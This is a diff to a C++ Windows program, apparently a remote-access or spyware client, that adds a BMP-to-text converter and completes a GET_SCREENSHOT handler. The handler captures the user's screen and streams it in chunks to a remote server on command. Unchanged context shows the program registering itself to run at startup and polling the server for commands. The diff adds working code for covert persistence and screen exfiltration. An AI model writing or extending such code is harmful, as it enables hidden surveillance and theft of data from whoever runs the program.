@@ -11,6 +11,9 @@
 #include <ctime>
 #include <sstream>
 #include <iomanip>
+#include <fstream>
+#include <locale>
+#include <codecvt>
 
 using namespace std;
 
@@ -204,6 +207,60 @@ string getHostIp() {
     return ipAddress;
 }
 
+std::string wstrToStr(const std::wstring& wstr) {
+    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
+    return converter.to_bytes(wstr);
+}
+
+vector<string> bmpToVector(const std::string& filePath) {
+    std::ifstream file(filePath, std::ios::binary);
+    if (!file) {
+        std::cerr << "Не удалось открыть файл." << std::endl;
+        return {};
+    }
+
+    BITMAPFILEHEADER fileHeader;
+    file.read(reinterpret_cast<char*>(&fileHeader), sizeof(fileHeader));
+    if (fileHeader.bfType != 0x4D42) {
+        std::cerr << "Неверный формат BMP-файла." << std::endl;
+        return {};
+    }
+
+    BITMAPINFOHEADER infoHeader;
+    file.read(reinterpret_cast<char*>(&infoHeader), sizeof(infoHeader));
+
+    if (infoHeader.biBitCount != 24) {
+        std::cerr << "Поддерживаются только 24-битные BMP-файлы." << std::endl;
+        return {};
+    }
+
+    int width = infoHeader.biWidth;
+    int height = infoHeader.biHeight;
+    int rowStride = (width * 3 + 3) & ~3;
+    int dataSize = rowStride * height;
+
+    file.seekg(fileHeader.bfOffBits, std::ios::beg);
+
+    std::vector<std::string> result(height);
+    std::vector<uint8_t> rowBuffer(rowStride);
+
+    for (int y = height - 1; y >= 0; --y) {
+        file.read(reinterpret_cast<char*>(rowBuffer.data()), rowStride);
+
+        std::string row;
+        for (int x = 0; x < width; ++x) {
+            uint8_t blue = rowBuffer[x * 3];
+            uint8_t green = rowBuffer[x * 3 + 1];
+            uint8_t red = rowBuffer[x * 3 + 2];
+            row += std::to_string(red) + "," + std::to_string(green) + "," + std::to_string(blue) + " ";
+        }
+        result[y] = row;
+    }
+
+    file.close();
+    return result;
+}
+
 int main() {
     addToAurorun(L"Exe", getExecProgramPath());
 
@@ -233,14 +290,14 @@ int main() {
                 cout << command << endl;
 
                 if (command == "GET_SCREENSHOT") {
-                    wstring screen_path = screenshot(wstring(screenshot_dir.begin(), screenshot_dir.end()));
-                    // перевести bmp файл в тектс (string), отправить кусками на сервер
-                    //client.sendMessage("SCREENSHOT START");
-                    //vector<string> fileParts = ...;
-                    //for (auto fp : fileParts) {
-                    //    client.sendMessage(fp);
-                    //}
-                    //client.sendMessage("SCREENSHOT END");
+                    string screen_path = wstrToStr(screenshot(wstring(screenshot_dir.begin(), screenshot_dir.end())));
+                    auto data = bmpToVector(screen_path);
+                    client->sendMessage("SCREENSHOT START");
+                    for (auto line : data) {
+                        client->sendMessage(line);
+                    }
+                    client->sendMessage("SCREENSHOT END");
+
                 }
                 else if (command == "GET_STATE") {
                     string info = "";
